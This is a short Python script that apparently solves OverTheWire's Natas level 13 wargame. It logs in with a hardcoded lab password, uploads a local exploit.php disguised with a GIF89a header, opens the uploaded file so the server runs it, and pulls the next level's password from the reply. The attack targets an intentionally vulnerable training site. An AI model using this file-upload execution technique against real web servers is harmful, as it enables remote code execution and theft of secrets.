#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import requests as req
import re


# TODO: Upload file && see source code.
user = "natas13"
passwd = "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"

viewSourceCode = 'index-source.html'

url = f"http://{user}.natas.labs.overthewire.org/"

data = {"filename": "exploit.php", "MAX_FILE_SIZE": "1000"}

# ? Choose your upload file.
files = {"uploadedfile": open("./Natas/L13/exploit.php", "rb")}

response = req.post(url, auth=(user, passwd), data=data, files=files)

content = response.text

# with open("./Natas/response.html", mode='w', encoding='utf-8') as f:
#     print(content, file=f)


# TODO: Go to your upload file
# ? Getting you upload file link.
uploadedfile = re.findall("The file <a href=\"(.*)\">upload", content)[0]
url += uploadedfile

response = req.get(url, auth=(user, passwd))

content = response.text

with open("./Natas/response.html", mode='w', encoding='utf-8') as f:
    print(content, file=f)


# TODO: Get the answer
answer = re.findall("GIF89a\n\n(.*)", content)[0]
print(answer)
